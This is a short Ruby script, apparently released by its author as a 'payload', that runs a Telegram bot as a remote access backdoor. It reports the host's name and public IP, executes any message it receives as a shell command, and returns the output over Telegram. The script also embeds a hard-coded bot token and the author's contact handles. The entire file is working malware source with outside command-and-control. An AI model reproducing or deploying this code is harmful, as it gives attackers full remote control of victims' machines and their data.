#!/usr/bin/ruby

#   Coded by ViRuS007

require "telegram/bot"

$TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo" 

Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
    begin
        bot.listen do |message|
            #bot.api.send_message(chat_id: message.chat.id, text: "Bot Has running...")
            case message.text
            when '/start'
                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\n\nEnter /help to see commands!")
            
            #Help command
            when '/help'
                help = """Help:
    /info => To Get ip and system info
    
for run shell command just send without `/` and \nRecive result.

Coded By : ViRuS007
Email : virus007@protonmail.com
Telegram ID : @Msf_Payload

Github: http://github.com/shayanzare/sia-payload
                """
                bot.api.send_message(chat_id: message.chat.id, text: "#{help}")

            #Get info of system
            when '/info'
                host = Socket.gethostname
                res = Net::HTTP.get(URI("http://ipinfo.io/json"))
                resf = res.to_s
                bot.api.send_message(chat_id: message.chat.id, text: "[*] Host name : #{host}\n\n#{resf}")
            
            #Get other command
            else
                command = message.text
                result = %x{#{command}}
                bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
        end
    end
    rescue Telegram::Bot::Exceptions::ResponseError => e
        retry
    end
end